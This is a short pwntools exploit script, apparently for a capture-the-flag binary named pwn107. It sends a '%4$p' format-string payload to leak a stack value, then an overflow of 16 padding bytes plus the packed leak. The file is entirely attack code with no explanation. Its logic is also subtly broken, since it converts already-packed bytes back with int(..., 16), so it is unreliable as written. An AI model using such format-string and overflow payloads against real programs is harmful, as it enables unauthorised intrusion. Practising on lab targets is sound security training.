
from pwn import *
from sys import argv

context.log_level = "debug"
context.binary = binary = ELF('./pwn107-1644307530397.pwn107')


p = process('./pwn107-1644307530397.pwn107')
#p = remote('10.10.70.4', 9007)
#pid = util.proc.pidof(p)[0]
#util.proc.wait_for_debugger(pid)

#gdb.attach(p)
p.recvuntil(b"What's your last streak? ")
p.sendline(b'%4$p')
recv = p.recv()

recv = str(recv).split("\\n")[1]

leak = recv.split(': ')[1]
leak = p64(int(leak, 16))

print('Leak: ', leak, int(leak, 16), p64(int(leak, 16)))

pad = b'A'*16   #int(argv[1])

#print('Data sended : ',pad+p64(int(leak,16))+b'KKKK' )



p.sendline(pad+p64(int(leak,16))+b'KKKK')
resp = p.recv()
print(resp)
#p.interactive()
